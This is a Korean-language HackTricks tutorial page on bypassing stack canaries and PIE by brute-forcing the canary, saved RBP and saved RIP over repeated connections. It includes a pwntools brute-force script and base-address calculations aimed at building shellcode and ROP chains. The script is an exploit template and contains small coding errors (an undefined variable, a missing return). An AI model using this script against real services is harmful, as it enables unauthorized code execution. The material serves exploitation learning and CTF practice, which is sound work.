# 스택 내의 BF 주소

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 **제로부터 영웅까지 AWS 해킹 배우기**</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나 HackTricks를 PDF로 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [**디스코드 그룹**](https://discord.gg/hRep4RUj7f)에 가입하거나 [**텔레그램 그룹**](https://t.me/peass)에 가입하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **해킹 트릭을 공유하려면 PR을 제출하여** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 기여하세요.

</details>

**캐너리와 PIE (Position Independent Executable)로 보호된 이진 파일을 직면하고 있다면 아마도 이를 우회해야 할 것입니다.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
**`checksec`**가 이진 파일이 캐너리로 보호되었음을 찾지 못할 수 있습니다. 이는 정적으로 컴파일되었고 함수를 식별할 수 없는 경우입니다.\
그러나 함수 호출 시작 시 스택에 값이 저장되고 이 값이 종료 전에 확인되는 경우 이를 수동으로 알 수 있습니다.
{% endhint %}

## 주소 브루트 포스

**PIE를 우회**하려면 **일부 주소를 노출**해야 합니다. 이진 파일이 어떤 주소도 노출하지 않는 경우 취약한 함수에서 스택에 저장된 **RBP와 RIP를 브루트 포스**하는 것이 가장 좋습니다.\
예를 들어, 이진 파일이 **캐너리**와 **PIE**를 사용하여 보호되었을 때, 캐너리를 브루트 포스한 다음 **다음** 8바이트(x64)는 저장된 **RBP**이고 **다음** 8바이트는 저장된 **RIP**가 될 것입니다.

{% hint style="success" %}
스택 내의 반환 주소는 주로 취약점이 있는 이진 코드에 속하는 것으로 가정됩니다. 이 경우, 취약점이 이진 코드에 있는 경우가 일반적입니다.
{% endhint %}

이진 파일에서 RBP와 RIP를 브루트 포스하기 위해 프로그램이 출력되거나 충돌하지 않는 경우 유효한 추측된 바이트를 올바르다고 간주할 수 있습니다. 캐너리를 브루트 포스하는 데 사용된 **동일한 함수**를 사용하여 RBP와 RIP를 브루트 포스할 수 있습니다:
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

# CANARY BF HERE
canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary

# PIE BF FROM HERE
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
마지막으로 PIE를 무력화하기 위해 필요한 것은 유출된 주소에서 유용한 주소를 계산하는 것입니다: RBP와 RIP.

RBP에서는 스택 내부에 셸을 작성하는 위치를 계산할 수 있습니다. 이는 스택 내부에 문자열 "/bin/sh\x00"을 작성할 위치를 파악하는 데 매우 유용할 수 있습니다. 유출된 RBP와 셸코드 간의 거리를 계산하려면 유출된 RBP 이후에 중단점을 설정하고 셸코드의 위치를 확인한 후 셸코드와 RBP 간의 거리를 계산할 수 있습니다:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP**에서는 **PIE 이진 파일의 기본 주소**를 계산할 수 있으며, 이는 **유효한 ROP 체인을 생성하는 데 필요**합니다.\
기본 주소를 계산하려면 `objdump -d vunbinary`를 수행하고 최신 주소를 확인하십시오:

![](<../../../.gitbook/assets/image (479).png>)

이 예에서는 모든 코드를 찾기 위해 **1바이트와 절반만 필요**하다는 것을 알 수 있습니다. 따라서 이 상황에서의 기본 주소는 **"000"으로 끝나는 노출된 RIP**이 될 것입니다. 예를 들어, `0x562002970ecf`가 노출되었다면 기본 주소는 `0x562002970000`이 됩니다.
```python
elf.address = RIP - (RIP & 0xfff)
```
## 개선 사항

[**이 게시물에서의 일부 관찰에 따르면**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#extended-brute-force-leaking), RBP 및 RIP 값이 유출될 때, 서버가 올바른 값이 아닌 일부 값으로 인해 충돌하지 않을 수 있으며 BF 스크립트는 올바른 값을 얻은 것으로 생각할 수 있습니다. 이는 **일부 주소가 정확한 값이 아니더라도 깨지지 않을 수 있기 때문**입니다.

해당 블로그 게시물에 따르면 서버로의 요청 사이에 짧은 지연을 추가하는 것이 권장됩니다.
